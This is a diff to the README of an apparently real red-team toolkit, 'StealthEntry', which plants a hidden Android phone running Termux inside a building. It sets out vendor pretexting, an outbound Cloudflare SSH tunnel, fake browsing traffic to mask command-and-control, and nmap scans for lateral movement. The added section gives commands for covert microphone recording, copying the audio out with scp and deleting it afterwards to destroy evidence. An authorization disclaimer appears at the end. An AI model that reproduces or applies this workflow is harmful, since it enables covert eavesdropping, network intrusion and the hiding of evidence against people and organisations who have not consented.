@@ -1,4 +1,6 @@
 # StealthEntry v1.0
+> **This is for hands-on red team hacking with real simulation. Not for "Box-Ticking Security", we dont play act like that to fake security.**
+
 **Accurate In-Network Persistence & Tactical Ingress**
 
 **Developer:** `Jake Lo`  
@@ -15,15 +17,13 @@ By leveraging **Phase 0 Intelligence**, this tool allows for surgical strikes ag
 
 ## 🎯 The Attack Chain (Jake Lo's Protocol)
 
-This toolkit is optimized for a professional, multi-stage lifecycle that begins long before the physical breach:
-
 ### **Phase 0: Pre-Action Intelligence (Reconnaissance)**
-* **Infrastructure History Recon:** Analyze the age and history of the target building. Older architectural infrastructures often suffer from poor **network isolation** (Flat Networks). Identifying a "legacy" building means that once an ingress point is established, you may be able to recon the entire building's shared network.
-* **Supply Chain Recon:** Identify the third-party ecosystem (Cleaning services, lift maintenance, IT contractors, HVAC repair). You do not always need to target the authorized test subject directly; playing the role of a trusted third-party vendor provides the most effective physical cover.
+* **Infrastructure History Recon:** Analyze the age of the target building. Older architectural infrastructures often suffer from poor **network isolation** (Flat Networks). Identifying a "legacy" building means that once an ingress point is established, you may be able to recon the entire building's shared network.
+* **Supply Chain Recon:** Identify the third-party ecosystem (Cleaning services, lift maintenance, HVAC repair). Playing the role of a trusted third-party vendor provides the most effective physical cover.
 
 ### **Phase 1: Physical Engagement (The Plant)**
-* **Social Engineering:** Leverage Phase 0 intelligence to gain physical access under a legitimate-looking pretense (e.g., service technician).
-* **Deployment:** Conceal the Android device (running Termux) near a stable power source (behind a printer, under a desk, or inside a network closet).
+* **Social Engineering:** Leverage Phase 0 intelligence to gain physical access under a legitimate pretense (e.g., service technician).
+* **Deployment:** Conceal the Android device (running Termux) near a stable power source.
 
 ### **Phase 2: Establish Ingress (The Persistence)**
 * **StealthEntry Activation:** Establish an outbound SSH tunnel via Cloudflare. This bypasses strict inbound firewall rules without requiring any local network modification or Root access.
@@ -31,22 +31,18 @@ This toolkit is optimized for a professional, multi-stage lifecycle that begins 
 
 ### **Phase 3: Exploitation & Pivot (The Move)**
 * **Internal Recon:** Perform `nmap` scans and service enumeration. 
-* **Lateral Movement:** Leverage the lack of network segmentation to pivot from the mobile implant deeper into high-value corporate assets or Building Management Systems (BMS).
+* **Lateral Movement:** Leverage the lack of network segmentation to pivot from the mobile implant deeper into high-value corporate assets.
 
 ---
 
 ## 🛠️ Environment Setup
 
 ### 1. Attacker Side (Your Kali Linux Machine)
-**CRITICAL:** Your Kali machine **must** have the Cloudflare Tunnel client installed to handle the `ProxyCommand`.
-
+**CRITICAL:** Your Kali machine **must** have the Cloudflare Tunnel client installed.
 ```bash
 # Download and Install Cloudflared (AMD64)
 wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
 sudo dpkg -i cloudflared-linux-amd64.deb
-
-# Verify installation
-cloudflared --version
 ```
 
 ### 2. Target Side (Android Device / Termux)
@@ -58,40 +54,51 @@ chmod +x termux_setup.sh
 
 ---
 
-## 🚀 Operational Workflow
+## 🚀 Operational SOP: Remote Audio Reconnaissance
 
-### Phase 1: On-Site Deployment
-1.  Open Termux and start a `tmux` session.
-2.  Execute `./run_on_termux.sh`.
-3.  **Capture:** Take a photo of the generated `ssh -o ProxyCommand...` command.
-4.  **Detach:** Press `Ctrl+B` then `D`.
-5.  **Hide:** Conceal the device and exit the premises.
+This section defines the standard workflow for implementing remote audio surveillance and data exfiltration.
 
-### Phase 2: Remote Operations
-1.  **Remote Login:** SSH into the device from your Kali machine using the captured command.
-2.  **Activate Mask:** Start `./normal_traffic.sh` in a new tmux window to hide your C2 traffic within legitimate HTTPS noise.
-3.  **Lateral Movement:**
-    ```bash
-    # Scan for vulnerabilities in the local subnet
-    nmap -sV --script=vuln [Target_Subnet]
-    ```
+### **Step 1: Implant Side (Termux)**
+Once the SSH session is established, execute the following commands:
+
+* **Path Verification (`Path Check`):**
+    * **Command:** `pwd`
+    * **Purpose:** Confirm the current absolute path before recording to ensure you can locate the file for `scp` retrieval later.
+* **Start Recording (`Start Recording`):**
+    * Use the `-f` flag to specify the filename (storing in the home directory is recommended).
+    * **Structure:** `termux-microphone-record -f <filename>.m4a`
+* **Stop Recording (`Stop Recording`):**
+    * Forcefully terminate the current microphone process.
+    * **Structure:** `termux-microphone-record -q`
+
+### **Step 2: Controller Side (Kali Linux PC)**
+Execute these commands in a local terminal (not inside the SSH session) to manage the C2 link and exfiltrate data.
+
+* **Remote Access (`C2 Login`):**
+    * Establish a stable encrypted connection. Always use `ServerAliveInterval` to maintain the session during long idle periods.
+    * **Structure:** `ssh -o ProxyCommand='cloudflared access ...' <user>@<dynamic_hostname>`
+* **Data Exfiltration (`SCP Download`):**
+    * Use `scp` with the tunnel proxy to pull the file from the path identified by `pwd`.
+    * **Structure:** `scp -o ProxyCommand='cloudflared access ...' <user>@<dynamic_hostname>:<remote_absolute_path/filename>.m4a ./`
 
 ---
 
 ## 🛡️ Core Components
 * **`run_on_termux.sh`**: Automates tunnel creation and persistent wake-locks.
-* **`normal_traffic.sh`**: Mimics standard HTTPS browsing behavior (Google, LinkedIn, etc.) to mask C2 pulse.
-* **`current_status.txt`**: Real-time remote health check of the implant.
+* **`normal_traffic.sh`**: Mimics standard HTTPS browsing behavior to mask C2 pulse.
+* **`termux-api` integration**: Enables remote microphone, camera, and location access.
 
 ---
 
-## 🔐 OpSec & Cleanup
-Wipe the implant traces remotely if the mission is compromised:
-```bash
-pkill cloudflared && pkill sshd && termux-wake-unlock && exit
-```
+## 🔐 OpSec & Field Notes
+* **Silent Cleanup:** Once data is confirmed on the Kali machine, immediately execute `rm <filename>.m4a` on the implant to destroy physical evidence.
+* **Permission Traps:** If recording fails, ensure the **Termux:API** app has been granted Microphone permissions (typically achieved via Social Engineering during Phase 1).
+* **Emergency Wipe:** If the mission is compromised, kill all processes remotely:
+  ```bash
+  pkill cloudflared && pkill sshd && termux-wake-unlock && exit
+  ```
 
 ---
 
 ## ⚠️ Disclaimer
-*This toolkit is developed by **Jake Lo** for authorized security assessments only. Unauthorized access to computer systems is strictly prohibited.*
+**This is for hands-on red team hacking with real simulation. Not for "Box-Ticking Security", we dont play act like that to fake security.** *This toolkit is developed by **Jake Lo** for authorized security assessments only. Unauthorized access to computer systems is strictly prohibited.*
